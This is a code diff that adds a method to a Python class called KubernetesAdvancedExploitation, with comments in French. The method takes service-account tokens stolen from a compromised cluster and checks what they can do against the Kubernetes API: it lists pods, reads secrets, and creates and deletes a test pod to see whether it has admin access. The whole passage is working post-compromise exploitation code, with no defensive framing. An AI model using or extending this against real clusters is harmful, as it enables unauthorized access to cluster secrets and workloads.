@@ -1171,6 +1171,72 @@ class KubernetesAdvancedExploitation:
         except Exception as e:
             self.logger.debug(f"❌ Énumération namespaces: {str(e)}")
 
+    async def _test_token_permissions(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
+        """Test des permissions avec les tokens découverts"""
+        try:
+            for token in cluster_info.service_accounts:
+                if not token.token:
+                    continue
+                    
+                headers = {"Authorization": f"Bearer {token.token}"}
+                
+                # Test d'accès aux pods
+                try:
+                    url = urljoin(base_url, "/api/v1/pods")
+                    async with session.get(url, headers=headers, timeout=self.config.timeout_per_operation) as response:
+                        if response.status == 200:
+                            token.permissions.append("pods:list")
+                            self.logger.debug(f"✅ Token {token.name}: accès pods")
+                        elif response.status == 403:
+                            self.logger.debug(f"❌ Token {token.name}: accès pods refusé")
+                except Exception:
+                    pass
+                    
+                # Test d'accès aux secrets
+                try:
+                    url = urljoin(base_url, "/api/v1/secrets")
+                    async with session.get(url, headers=headers, timeout=self.config.timeout_per_operation) as response:
+                        if response.status == 200:
+                            token.permissions.append("secrets:list")
+                            token.is_cluster_admin = True  # Accès aux secrets = admin probable
+                            self.logger.debug(f"✅ Token {token.name}: accès secrets (ADMIN)")
+                        elif response.status == 403:
+                            self.logger.debug(f"❌ Token {token.name}: accès secrets refusé")
+                except Exception:
+                    pass
+                    
+                # Test de création de pods
+                try:
+                    url = urljoin(base_url, "/api/v1/namespaces/default/pods")
+                    test_pod = {
+                        "apiVersion": "v1",
+                        "kind": "Pod",
+                        "metadata": {"name": f"test-{self.session_id[:6]}"},
+                        "spec": {
+                            "containers": [{"name": "test", "image": "alpine:latest", "command": ["sleep", "10"]}]
+                        }
+                    }
+                    async with session.post(url, headers=headers, json=test_pod, timeout=self.config.timeout_per_operation) as response:
+                        if response.status in [200, 201]:
+                            token.permissions.append("pods:create")
+                            token.is_cluster_admin = True
+                            self.logger.debug(f"✅ Token {token.name}: création pods (ADMIN)")
+                            
+                            # Nettoyer le pod de test
+                            delete_url = urljoin(base_url, f"/api/v1/namespaces/default/pods/test-{self.session_id[:6]}")
+                            try:
+                                async with session.delete(delete_url, headers=headers, timeout=5) as del_response:
+                                    pass
+                            except:
+                                pass
+                        elif response.status == 403:
+                            self.logger.debug(f"❌ Token {token.name}: création pods refusée")
+                except Exception:
+                    pass
+                    
+        except Exception as e:
+            self.logger.debug(f"❌ Test permissions tokens: {str(e)}")
+
     def _calculate_vulnerability_score(self, cluster_info: CompromisedCluster):
         """Calcul du score de vulnérabilité"""
         score = 0.0
